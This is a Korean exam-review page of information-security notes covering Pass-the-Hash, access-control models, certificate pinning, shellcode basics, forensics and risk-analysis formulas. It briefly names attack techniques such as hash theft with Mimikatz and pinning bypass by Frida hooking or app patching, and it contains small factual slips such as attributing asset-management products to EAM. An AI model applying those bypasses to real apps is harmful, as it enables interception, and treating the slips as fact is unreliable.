+<article class="topic"><h2><span class="n">02</span>Pass-the-Hash 공격</h2><div class="qs">ch1-02 Q1</div><p class="why">비밀번호를 몰라도 '비밀번호의 해시값'만 있으면 로그인할 수 있는 윈도우 인증의 약점이다. 해시는 비밀번호를 지키는 수단인데, 오히려 해시 자체가 열쇠가 되는 상황을 이해해야 한다.</p><ul><li><b>Pass-the-Hash</b> — Mimikatz 같은 도구로 메모리에서 <b>NTLM / LanMan 해시</b>를 빼낸 뒤, 그 해시값을 그대로 보내 원격 서버·서비스 인증을 통과하는 기법</li>
+<li>왜 되는가: NTLM 인증은 비밀번호 원문이 아니라 해시값으로 응답을 만들기 때문에, 해시만 있으면 비밀번호를 아는 것과 같다</li>
+<li>대응
+  <ul><li>패스워드 해시값을 외부로 노출하지 않음</li>
+  <li>NTLM 대신 <b>Kerberos</b> 프로토콜 사용</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">03</span>EAM과 IAM</h2><div class="qs">ch2-01 서술 Q1</div><p class="why">회사에는 시스템마다 계정과 권한이 흩어져 있다. 이를 한곳에서 관리하는 솔루션이 EAM과 IAM이며, 둘의 공통점·차이·장단점을 묻는다.</p><ul><li>공통 기능: <b>통합인증(SSO), 권한 부여, 자원 관리, 보안 정책</b></li>
+<li><b>EAM</b>(Extranet Access Management)
+  <ul><li>관리 대상: 업무 시스템(Windows·Linux 서버, DB 등)과 애플리케이션 <b>계정의 권한</b></li>
+  <li>장점: 자산 권한 관리, 유지보수 비용 절감, 시스템 권한의 중앙 통제</li>
+  <li>단점: 관리자가 직접 권한을 관리해 관리 비용 증가, 계정을 수동 생성해 운영 비용 증가, 관리 어려움</li>
+  <li>솔루션: Oracle EAM, IBM Maximo</li></ul></li>
+<li><b>IAM</b>(Identity and Access Management)
+  <ul><li>관리 대상: <b>실시간 사용자 계정</b></li>
+  <li>장점(EAM 대비 개선): 조직 전체 사용자 계정 <b>자동 관리·생성</b>, 정책에 따른 권한 부여·회수 <b>자동화</b></li>
+  <li>단점: 초기 설정 복잡, 다양한 권한 모델 설계 난이도, 타 시스템 연동 비용</li>
+  <li>솔루션: Okta, Azure AD</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">04</span>접근통제 정책: MAC · DAC · RBAC</h2><div class="qs">ch2-02 Q1·Q2</div><p class="why">'누가 무엇에 접근할 수 있는가'를 정하는 세 가지 방식이다. 권한을 누가 주는지, 무엇을 기준으로 판단하는지가 구분 포인트다.</p><ul><li><b>강제적 접근통제(MAC)</b> — 주체와 객체의 <b>보안 등급(Security Label)</b>을 비교해 접근 허용. 관리자만 분류를 정하고 바꿈. 권한 부여자: <b>시스템</b></li>
+<li><b>임의적 접근통제(DAC)</b> — 주체의 <b>신분(Identity, ID)</b>에 근거해 접근 제한. 보통 ACL 사용. 권한 부여자: <b>데이터 소유자</b></li>
+<li><b>역할 기반 접근통제(RBAC)</b> — 주체의 <b>역할(Role)</b>에 따라 접근 제한. MAC과 DAC의 단점을 보완. 권한 부여자: <b>중앙 관리자</b></li>
+<li>한 줄 구분: MAC=등급, DAC=신원, RBAC=역할</li></ul></article>
+<article class="topic"><h2><span class="n">05</span>접근통제 보안 모델: 벨-라파듈라 · 비바</h2><div class="qs">ch2-02 서술 Q1</div><p class="why">등급이 다른 사용자와 문서 사이에서 읽기·쓰기를 어떻게 막아야 기밀성 또는 무결성이 지켜지는지를 규칙으로 만든 모델이다. 두 모델의 규칙이 서로 반대라서 헷갈리기 쉽다.</p><ul><li><b>벨-라파듈라(BLP)</b> — 미 국방성 지원, <b>기밀성</b> 강조
+  <ul><li><b>No Read Up</b> — 낮은 등급 주체는 높은 등급 객체를 읽을 수 없음 (상위 문서 읽기 금지, 하위 읽기 허용)</li>
+  <li><b>No Write Down</b> — 높은 등급 주체는 낮은 등급 객체에 쓸 수 없음 (하위 문서 쓰기 금지, 상위 쓰기 허용) → 비밀이 아래로 새는 것을 막음</li></ul></li>
+<li><b>비바(Biba)</b> — BLP의 단점을 보완한 <b>무결성</b> 보장 모델, 최초의 상업용 모델
+  <ul><li><b>No Read Down</b> — 높은 등급 주체는 낮은 등급 객체를 읽을 수 없음 (하위 문서 읽기 금지)</li>
+  <li><b>No Write Up</b> — 낮은 등급 주체는 높은 등급 객체를 수정할 수 없음 (상위 문서 쓰기 금지) → 믿을 수 없는 정보가 위로 섞이는 것을 막음</li></ul></li>
+<li>기억법: BLP는 '위로 못 읽고 아래로 못 쓴다', Biba는 정확히 반대</li></ul></article>
+<article class="topic"><h2><span class="n">06</span>인증서 고정(Certificate Pinning)</h2><div class="qs">ch2-03 Q1</div><p class="why">앱이 서버와 HTTPS로 통신할 때, 공격자가 가짜 인증서로 끼어들면(중간자 공격) 암호화가 무력해진다. 앱에 '진짜 서버 인증서'를 미리 박아 두는 것이 인증서 고정이다.</p><ul><li><b>개념</b> — 클라이언트(모바일 앱)가 사전에 정해 둔 특정 인증서 또는 공개키만 유효한 것으로 인정하도록 강제하는 기법</li>
+<li><b>막는 공격</b> — <b>중간자(MITM) 공격</b>, 잘못된 인증서 체인 사용</li>
+<li>구성 요소 3가지
+  <ul><li><b>고정할 인증서(공개키)</b> — 앱에 하드코딩하거나 리소스로 포함</li>
+  <li><b>인증서 관리</b> — 보관·갱신·검증. 키 교체 방안, TLS 핸드셰이크 때 일치 여부 검증</li>
+  <li><b>오동작 및 로그 관리</b> — 불일치 시 차단·알람 처리 로직, 이벤트 로그</li></ul></li>
+<li>우회 방법
+  <ul><li><b>Frida 등 후킹 도구</b>로 HostNameVerifier 같은 검증 함수를 후킹해 우회</li>
+  <li><b>앱 수정</b> — 디컴파일 후 검증 로직을 고쳐 재배포</li>
+  <li>기기에 신뢰할 수 있는 중간 CA를 설치해 MITM</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">07</span>쉘 코드와 어셈블리 기초</h2><div class="qs">ch3-01 Q1·Q5·Q6</div><p class="why">익스플로잇·리버싱 문제는 어셈블리 명령어의 기계어 값, 함수 인자가 들어가는 레지스터, 동적 링킹 구조를 묻는다. 암기 항목이지만 '왜 그런지'를 알면 덜 헷갈린다.</p><ul><li><b>쉘 코드(Shell Code)</b> — 시스템의 특정 명령을 실행하기 위한 작은 기계어 프로그램. <b>리버스 엔지니어링</b>은 실행 파일·쉘 코드의 동작을 분석하는 기술</li>
+<li>주요 명령어와 기계어
+  <ul><li><b>NOP = 0x90</b> — 아무 일도 안 함. 쉘 코드 앞에 깔아 실행 흐름을 유도(NOP 썰매)</li>
+  <li><b>RET = 0xC3</b> — 스택에 저장된 복귀 주소로 돌아감. <b>RET EIP ESP</b>: ESP(스택 포인터)의 값을 EIP(명령 포인터)로 옮김</li>
+  <li><b>JMP = 0xEB</b> — 해당 주소로 점프 / <b>CALL = 0xE8</b> — 함수 호출, 복귀 주소 저장</li></ul></li>
+<li>64비트 리눅스 함수 인자 레지스터 순서: 1번째 <b>RDI</b> → 2번째 <b>RSI</b> → 3번째 <b>RDX</b> → 4번째 <b>RCX</b>
+  <ul><li>printf("%c %c %c", 'A','B','C') → 형식 문자열=RDI, 'A'=RSI, 'B'=RDX, 'C'=RCX</li></ul></li>
+<li><b>동적 링킹</b> — 실행할 때 외부 라이브러리를 연결. 라이브러리가 프로그램 밖에 있어 함수 주소를 알아오는 과정이 필요
+  <ul><li><b>PLT</b>(Procedure Linkage Table) — 외부 함수를 호출하는 창구. 외부 함수 호출은 PLT를 거침</li>
+  <li><b>GOT</b>(Global Offset Table) — 외부 함수의 <b>실제 주소</b>를 저장. PLT가 GOT를 참고해 실제 주소로 감</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">08</span>클라우드 서비스 모델</h2><div class="qs">ch3-01 Q2</div><p class="why">클라우드는 '어디까지 빌려 쓰는가'에 따라 세 층으로 나뉜다. 설명을 보고 유형을 고르는 문제다.</p><ul><li><b>IaaS</b>(Infrastructure) — 서버·스토리지·네트워크 등 <b>하드웨어 자원</b>을 서비스로 제공</li>
+<li><b>PaaS</b>(Platform) — 인프라 관리 없이 애플리케이션을 개발·실행·관리할 수 있는 <b>플랫폼</b> 제공</li>
+<li><b>SaaS</b>(Software) — <b>소프트웨어와 데이터</b> 자체를 서비스로 제공</li>
+<li>비유: IaaS=빈 땅 임대, PaaS=건물 임대, SaaS=완성된 가게 이용</li></ul></article>
+<article class="topic"><h2><span class="n">09</span>보안 솔루션: EDR · DLP · BYOD 보안</h2><div class="qs">ch3-01 Q3·Q7 · 서술 Q3</div><p class="why">설명문을 읽고 솔루션 이름을 쓰는 문제다. 각 솔루션이 '어디서, 무엇을' 지키는지로 구분한다.</p><ul><li><b>EDR</b>(Endpoint Detection and Response) — 컴퓨터·모바일·서버 등 <b>단말</b>의 악성 행위를 실시간 탐지·분석·대응. 제로데이 공격 방어에 효과적
+  <ul><li>기능: <b>탐지</b>(파일 기반 외의 사고도) · <b>통제</b>(사고 억제) · <b>분석</b>(조사 기반 대응) · <b>치료</b>(감염 전 상태로 복구)</li></ul></li>
+<li><b>DLP</b>(Data Loss Prevention) — 내부의 민감 데이터·지적재산·고객정보가 <b>외부로 유출</b>되는 것을 모니터링하고 실시간 차단
+  <ul><li>엔드포인트 DLP(단말에 설치) / 네트워크 DLP(패킷 필터링)</li></ul></li>
+<li>BYOD(개인 기기 업무 사용) 보안 기술
+  <ul><li><b>MDM</b>(Mobile Device Management) — 스마트폰·태블릿 등 디바이스 관리. 루팅 탐지·차단, 원격 앱 관리, 설정·자산 관리</li>
+  <li><b>컨테이너화</b> — 실행환경을 격리한 샌드박스 안에서만 기밀 정보 접근·업무 앱 구동</li>
+  <li><b>모바일 가상화</b> — 한 기기에 같은 OS의 다중 인스턴스를 두어 업무용·개인용 모드를 동시에 사용</li>
+  <li>그 밖에: VDI(서버가 가상 데스크톱 제공), 클라우드 DaaS, 앱래핑(앱에 보안 코드 삽입)</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">10</span>블록체인</h2><div class="qs">ch3-01 Q4</div><p class="why">분산 장부 기술의 기본 용어를 묻는다. 비트코인·블록체인·채굴의 관계를 한 문장으로 설명할 수 있으면 된다.</p><ul><li><b>블록체인</b> — 분산 데이터베이스의 한 형태. 분산 노드 운영자가 임의로 조작할 수 없도록 설계되어 계속 성장하는 기록(블록)을 연결한 모음</li>
+<li>주요 기술
+  <ul><li><b>분산 원장</b> — 참여자 합의로 복제·공유되는 저장소. 탈중앙화의 기반</li>
+  <li><b>채굴(마이닝)</b> — 거래를 검증하고 새 블록을 만들어 체인에 추가하는 과정. 해시 연산으로 작업을 증명한 대가로 코인을 받음</li>
+  <li><b>스마트 계약</b> — 조건이 충족되면 제3자 개입 없이 자동 실행되는 계약</li>
+  <li><b>합의 알고리즘</b> — 참여자들이 데이터 적합성에 동의하는 과정. PoW, PoS</li></ul></li>
+<li><b>비트코인</b> — 사토시 나카모토가 개발한 온라인 암호화폐. 중앙은행 없이 P2P로 송금 / <b>이더리움</b> — 스마트 계약을 구현하는 분산 컴퓨팅 플랫폼이자 통화</li></ul></article>
+<article class="topic"><h2><span class="n">11</span>디지털 포렌식</h2><div class="qs">ch3-01 Q8 · 서술 Q1·Q2</div><p class="why">사고 증거를 법정에서 쓰려면 수집·보관 과정이 엄격해야 한다. 5원칙의 이름과 내용, 절차 순서가 거의 매번 나온다.</p><ul><li><b>디지털 포렌식</b> — 디지털 매체를 매개로 한 범죄의 법적 증거 확보를 위해 자료를 수집·분석·보존해 법적 증거물로 제출할 수 있게 하는 절차와 방법</li>
+<li>5원칙
+  <ul><li><b>정당성</b> — 적법한 절차로 수집. 불법 수집은 증거 능력 상실</li>
+  <li><b>재현</b> — 같은 조건에서 항상 같은 결과가 나와야 함</li>
+  <li><b>신속성</b> — 빨리 수집. 메모리의 휘발성 정보(실행 중 프로세스 등)는 늦으면 사라짐</li>
+  <li><b>연계 보관성</b>(Chain of Custody) — 수집→이송→분석→보관→법정 제출 전 과정이 명확하고 추적 가능. 인수인계 기록과 검증 필요</li>
+  <li><b>무결성</b> — 각 단계에서 위·변조되지 않았음을 입증. <b>해시값</b>으로 검증</li></ul></li>
+<li>절차: <b>준비 → 증거획득 → 보관/이송 → 검증/분석 → 보고서 제출</b> (암기: 준획이분보)</li></ul></article></section>
+<section class="subj" id="c6"><div class="subj-head"><h2>6과목 위험분석 및 정보보안 관리</h2><div class="note">괄호 숫자는 ch1 단원(01 정보보호관리 / 02 위험) · 주제 10개</div></div><article class="topic"><h2><span class="n">01</span>정보보호 정책 체계</h2><div class="qs">01 Q1·Q2·Q6</div><p class="why">조직이 '무엇을, 어떻게 지킬지'를 글로 정해 두는 출발점이다. 시험은 정책 아래 문서들의 역할 차이와 정책의 구성 요건을 묻는다.</p><ul><li><b>정보보호 정책</b> — 정보보호의 목적과 기본 방향을 정한 <b>최상위 문서</b>. 최고경영자가 승인
+  <ul><li>구성 요건 5가지: <b>목적</b>(무엇을 지킬지) · <b>적용 범위</b>(업무·서비스·조직·사람·자산) · <b>내용</b>(간단·명료) · <b>책임</b>(경영진·보안조직·직원) · <b>문서화</b>(공식 승인)</li></ul></li>
+<li>정책을 구체화하는 세 문서
+  <ul><li><b>표준(Standards)</b> — 기술적 세부 기준. 모든 사용자가 지켜야 하는 <mark>의무·강제</mark></li>
+  <li><b>지침(Guideline)</b> — 도움이 되는 권고 사항. <mark>선택적</mark></li>
+  <li><b>절차(Procedure)</b> — 실제로 어떻게 하는지 단계별로 쓴 문서. 실무자용</li></ul></li>
+<li><b>정보보호 거버넌스</b> — 기업 거버넌스의 <b>부분집합</b>. 정보 무결성·서비스 연속성을 보장하고 전략적 방향을 제시하며, 경영 목표와 정보보호 목표를 <b>일치</b>시키는 체계</li></ul></article>
+<article class="topic"><h2><span class="n">02</span>정보보호의 목표</h2><div class="qs">01 Q3·Q4·Q5</div><p class="why">모든 보안 기술은 결국 기밀성·무결성·가용성(CIA) 중 하나를 지키기 위한 것이다. 각 목표의 정의 문장과 대표 기술을 연결해 외운다.</p><ul><li><b>기밀성(Confidentiality)</b> — 인가된 사람·시스템만 정보에 접근. 비인가자에게 노출되지 않음 → 암호화, 접근 제어, 비밀번호</li>
+<li><b>무결성(Integrity)</b> — 비인가자가 변경·삭제·생성하지 못함. 정확성과 완전성 보장 → 체크섬, 해시 함수, 디지털 서명</li>
+<li><b>가용성(Availability)</b> — 정당한 사용자가 필요할 때 서비스를 계속 쓸 수 있음 → 백업, RAID, DRS</li>
+<li>그 밖의 목표
+  <ul><li><b>책임 추적성</b> — 누가 무엇을 했는지 추적하고 책임지게 함</li>
+  <li><b>부인방지</b> — 송신자·수신자가 자신의 행위를 부인하지 못하게 함</li>
+  <li><b>인증</b> — 사용자·시스템의 신원을 확인해 실제 권한자인지 검증</li></ul></li>
+<li>위험 관리 계획을 세울 때는 <b>위험평가</b>로 업무 우선순위와 보호 대책 수준을 정한다</li></ul></article>
+<article class="topic"><h2><span class="n">03</span>위험의 구성요소</h2><div class="qs">02 Q4·Q13·Q15·Q17·Q22·Q28·Q35 · 서술 Q12</div><p class="why">위험은 네 요소가 얽혀 만들어진다. 관계를 이해하면 공식·관계도·용어 문제를 한 번에 푼다. (집에 비유: 자산=귀중품, 위협=도둑, 취약성=안 잠긴 창문, 대책=자물쇠)</p><ul><li><b>자산(Asset)</b> — 지켜야 할 대상. 정보·하드웨어·소프트웨어·시설 + 인력·기업 이미지 같은 무형 자산. 위험 분석에서 파악할 것은 <b>사고 시 손실</b></li>
+<li><b>위협(Threat)</b> — 자산에 손실을 일으킬 수 있는 원치 않는 사건의 원인·행위자. 환경적(자연재해·장비 고장) / 인간적(해킹·내부자 유출)</li>
+<li><b>취약성(Vulnerability)</b> — 자산에 내재된 약점. 위협이 이용하는 대상. <b>정보보호 대책의 미비</b>로 생기며, 대책을 적용하면 줄어듦</li>
+<li><b>정보보호 대책(Safeguard)</b> — 위험을 억제하거나 허용 수준으로 낮추는 관리적·물리적·기술적 장치. 제품(방화벽·IDS)뿐 아니라 절차·정책·교육도 포함. 구축 비용 + 운영 비용을 함께 고려</li>
+<li>관계: 위협은 취약성을 <b>공격</b>하고, 취약성은 자산을 <b>노출</b>하며, 자산은 가치를 <b>보유</b>한다. 이들은 모두 위험을 <b>증가</b>시키고, 대책은 위협을 방어해 위험을 <b>감소</b>시킨다</li>
+<li><b>잔여 위험</b> = (자산) × (취약점) × (위협) − (정보보호 대책). 대책을 적용한 뒤에도 남는 위험 (암기: 자취위대)</li></ul></article>
+<article class="topic"><h2><span class="n">04</span>위험 관리 과정과 용어</h2><div class="qs">02 Q1·Q7·Q21·Q26·Q29·Q31·Q33</div><p class="why">위험 '분석·평가·관리'는 비슷해 보여도 시험에서는 엄격히 구분한다. 전체 흐름 안에서 각 단계가 하는 일을 기억한다. (건강검진 비유: 분석=검사로 수치 뽑기, 평가=기준과 비교해 위험한지 판단, 관리=전체 과정)</p><ul><li>위험 관리 과정 5단계
+  <ul><li>① <b>위험 관리 전략·계획 수립</b> — 조직 목표와 연계, 방법·비용·시간·인력 결정</li>
+  <li>② <b>위험 분석(Risk Analysis)</b> — 자산·위협·취약점·기존 대책을 분석해 위험의 <b>종류와 규모</b> 결정</li>
+  <li>③ <b>위험평가(Risk Assessment)</b> — 분석 결과로 위험도를 매기고, <b>DoA</b>를 정해 우선순위와 대응 여부 결정. DoA를 넘는 위험에만 대책 수립</li>
+  <li>④ <b>정보보호 대책 선정</b> — 위험처리 전략과 통제 사항 선택, 대책 명세서 작성</li>
+  <li>⑤ <b>정보보호 계획 수립</b> — 우선순위·일정·예산·책임자가 든 이행 계획</li></ul></li>
+<li><b>위험 관리(Risk Management)</b> — 위험을 감수할 수 있는 수준으로 유지하기 위해 분석하고 비용 대비 효과적인 대책을 마련하는 전체 과정</li>
+<li><b>위험 관리 계획(Risk Management Plan)</b> — 선택된 통제를 <b>누가·언제·어디서·어떻게</b> 적용할지 명시한 종합 전략 문서</li>
+<li><b>수용 가능한 목표 위험 수준(DoA)</b> — 경영진이 의사결정으로 정한 '여기까지는 감수한다'는 한계선. 위험이 낮아도 대책 효과성 평가와 모니터링은 계속해야 함</li></ul></article>
+<article class="topic"><h2><span class="n">05</span>위험 분석 절차와 자산 분석</h2><div class="qs">02 Q2·Q24·Q25·Q34 · 서술 Q2·Q7·Q10·Q11</div><p class="why">위험 분석은 '무엇을 가지고 있는지' 아는 것에서 시작한다. 절차의 순서와 자산 분석 3단계를 묻는다.</p><ul><li>위험 분석 절차 7단계: <b>범위 결정 → 자산 식별 → 자산 가치 평가 → 위협 및 발생 가능성 평가 → 취약성 평가 → 기설치 보안대책 평가 → 위험 정도 평가</b>
+  <ul><li>위험 정도 평가 — 자산 가치·위협 가능성·취약성·대책 효과를 종합해 상·중·하로 분류, 개선 우선순위 도출</li></ul></li>
+<li>자산 분석 3단계
+  <ul><li><b>자산 식별</b> — 보호 대상 자산을 빠짐없이 찾아 <b>자산목록</b> 작성. 가장 기초이자 필수</li>
+  <li><b>자산 가치 평가</b> — C·I·A 관점에서 <b>중요도</b> 분석. 정량(영향도·점수) / 정성(낮음·보통·높음 등급)</li>
+  <li><b>자산 그룹핑</b> — 유형·중요도가 비슷한 자산을 한 그룹으로 묶음 → 중복 분석이 없어져 시간·비용 절감, 일관성 확보</li></ul></li>
+<li>기밀성 등급: <b>높음</b>=허가자만 열람, 외부 유출 시 치명적 / <b>중간</b>=조직 내 공개 가능, 외부 유출 시 상당한 문제 / <b>낮음</b>=외부 유출돼도 영향 미미</li>
+<li>위험 평가서 항목: 자산 중요도(C,I,A) · <b>우려사항</b>(자산이 직면한 위협 시나리오) · <b>가능성</b>(위협이 실제 발생할 빈도·확률) → 위험도</li></ul></article>
+<article class="topic"><h2><span class="n">06</span>위험 분석 접근법 4가지</h2><div class="qs">02 Q6·Q20 · 서술 Q4·Q9</div><p class="why">모든 자산을 같은 깊이로 분석하면 비용이 너무 든다. 상황에 맞는 접근법을 고르는 것이 핵심이며 장단점 서술이 자주 나온다. (건강검진 비유: 기본 검진 / 의사 감 / 정밀 검사 전부 / 이상 부위만 정밀 검사)</p><ul><li><b>기준선 접근법(Baseline)</b> — 체크리스트의 보안대책이 구현돼 있는지 판단해 없는 것을 구현. 모든 시스템에 기본 보호 수준 적용
+  <ul><li>장점: 시간·비용 적게 들고 특별한 자원 불필요 / 단점: 조직 특성을 반영 못 해 과보호·부족 보호 가능</li></ul></li>
+<li><b>비정형 접근법(Informal)</b> — 구조적 방법론 없이 경험자의 지식으로 중요 위험 중심 분석</li>
+<li><b>상세 위험 분석(Detailed)</b> — 모든 IT 자산을 정립된 모델로 자산·위협·취약성 분석. 업무 중요도나 자산 가치가 큰 경우 적용
+  <ul><li>장점: 시스템별 적절한 보안 수준 확인, 가장 상세 / 단점: 시간·비용·전문성 많이 들고 중요 시스템이 늦게 다뤄질 수 있음</li></ul></li>
+<li><b>통합(복합·혼합) 접근법(Combined)</b> — 고위험 영역만 상세 분석, 나머지는 기준선. <mark>가장 비용 효율적, 가장 권장</mark>
+  <ul><li>장점: 유연한 적용, 자원 효율, 고위험 영역 빠른 처리, 부분 계량화 / 단점: 고위험 영역을 잘못 식별하면 비용 낭비·부적절 대응, 상세 분석이 필요한 시스템이 빠질 수 있음</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">07</span>정성적 분석과 정량적 분석</h2><div class="qs">02 Q3·Q12·Q16·Q18·Q27 · 서술 Q3·Q5·Q6</div><p class="why">위험을 '말'로 매기는가 '숫자'로 매기는가의 차이다. 정량 공식은 계산 문제로 바로 나오므로 예제까지 손에 익힌다.</p><ul><li>정성적 위험 분석
+  <ul><li><b>델파이법</b> — 전문가 집단의 토론으로 분석. 빠르고 비용 적지만 추정 정확도 낮음</li>
+  <li><b>시나리오법</b> — '어떤 사건도 기대대로 일어나지 않는다'는 전제로 조건별 결과를 추정. 적은 정보로 가능하고 의사소통에 좋지만 이론적 추측에 그침</li>
+  <li><b>순위 결정법</b> — 중요도·가능성·영향력 기준으로 순위를 매겨 상대 평가</li>
+  <li><b>퍼지 행렬법</b> — 자산·위협·보안 체계를 정성 언어값으로 표현해 기대손실 평가</li></ul></li>
+<li>정량적 위험 분석 공식
+  <ul><li><b>SLE</b>(단일 예상 손실액) = <b>AV</b>(자산 가치) × <b>EF</b>(노출계수, 손실 비율)</li>
+  <li><b>ALE</b>(연간 예상 손실액) = SLE × <b>ARO</b>(연간 발생률 = 발생 횟수 / 기간)</li>
+  <li><b>ROI</b> = (ALE − X) / X × 100% (X = 투입 비용)</li>
+  <li>대책 적용 시 순이익 = (적용 전 ALE − 적용 후 ALE) − 대책 비용. 두 대책을 비교할 때는 <b>순이익이 큰 쪽</b> 선택</li></ul></li>
+<li>예제: 자산 40억, 화재 시 30% 손실, 5년에 1번 → SLE = 40억 × 0.3 = 12억, ARO = 1/5 = 0.2, ALE = 12억 × 0.2 = 2.4억</li></ul></article>
+<article class="topic"><h2><span class="n">08</span>위험 처리(대응) 방식 4가지</h2><div class="qs">02 Q5·Q8·Q11·Q14·Q19·Q32 · 서술 Q1·Q8</div><p class="why">위험을 찾았으면 어떻게 할지 정해야 한다. 거의 매회 나오므로 정의 문장을 정확히 외운다. (오토바이 배달 비유: 그냥 탄다=수용, 헬멧=완화, 보험=전가, 배달 안 함=회피)</p><ul><li><b>위험 수용(Acceptance)</b> — 현재 위험을 받아들이고 손실을 감수. 완전 제거는 불가능하므로 일정 수준 이하는 인정하고 사업 진행</li>
+<li><b>위험 완화(Reduction·Mitigation, 감소·축소)</b> — 대책을 채택·구현해 위험을 허용 범위로 낮춤. 대책 선택 시 소요 비용과 위험 감소 크기를 비교(비용효과 분석)</li>
+<li><b>위험 전가(Transition·Transfer, 전이)</b> — 위험은 그대로 두고 손실·책임을 제3자에게 이전. 방법은 <b>보험 가입, 외주 위탁</b>. 비용 수반</li>
+<li><b>위험 회피(Avoidance)</b> — 위험이 있는 프로세스·사업을 수행하지 않거나 중단해 위험 자체를 없앰</li></ul></article>
+<article class="topic"><h2><span class="n">09</span>통제의 종류</h2><div class="qs">02 Q9·Q10</div><p class="why">대책(통제)은 '언제 작동하는가'로 나눈다. 시점별 3가지와 예방 통제의 하위 2가지를 묻는다. (학교 비유: 교문 경비=예방, CCTV=탐지, 사고 후 조치=교정)</p><ul><li>시점별 통제
+  <ul><li><b>예방 통제</b> — 잠재 위험 요소를 사전에 제거. 선제적·능동적</li>
+  <li><b>탐지 통제</b> — 예방 통제를 우회해 발생한 문제를 찾아냄</li>
+  <li><b>교정 통제</b> — 탐지된 사고에 대처하고 위험을 최소화</li></ul></li>
+<li>예방 통제의 유형
+  <ul><li><b>물리적 접근 통제</b> — 관계자 외 시설·설비 접근 제한</li>
+  <li><b>논리적 접근 통제</b> — 승인되지 않은 사람이 네트워크로 자산에 접근하지 못하게 함</li></ul></li></ul></article>
+<article class="topic"><h2><span class="n">10</span>ISO 31000 위험 관리 프레임워크</h2><div class="qs">02 Q23·Q30</div><p class="why">국제 표준이 정한 위험 관리의 큰 틀이다. 그림 문제로 나오며 '위험 평가' 안의 세 단계 순서를 묻는다. (찾기 → 재기 → 판단하기)</p><ul><li>흐름: <b>환경 설정 → 위험 평가 → 위험 처리 → 위험 수용</b>, 전 과정에 걸쳐 <b>의사소통 및 협의</b>, <b>위험 모니터링 및 검토</b></li>
+<li><b>환경 설정</b> — 조직의 환경·이해관계자·범위·기준을 정의. 어떤 관점에서 위험을 다룰지 기준 설정</li>
+<li>위험 평가 3단계
+  <ul><li><b>위험 식별(Risk Identification)</b> — 자산·위협·취약점과 법규·이해관계자 기대·내외부 환경을 검토해 잠재 위험을 찾음</li>
+  <li><b>위험 분석(Risk Analysis)</b> — 식별된 위험의 성격·영향을 분석해 심각도 평가</li>
+  <li><b>위험 수준 평가(Risk Evaluation)</b> — 조직의 위험 기준과 비교해 수용 여부·우선순위 결정. 위험 감수성(Risk Appetite)을 고려해 DoA 결정</li></ul></li>
+<li><b>위험 처리</b> — 회피·전가·완화·수용 적용. 결과가 만족스럽지 않으면 재검토 후 다시 위험평가로</li>
+<li><b>위험 수용</b> — 허용 가능한 수준으로 관리되면 최종 수용</li></ul></article></section>
+<footer>기출문제 페이지의 정답·해설을 주제별로 다시 묶어 쓴 정리</footer>
+</div></body></html>
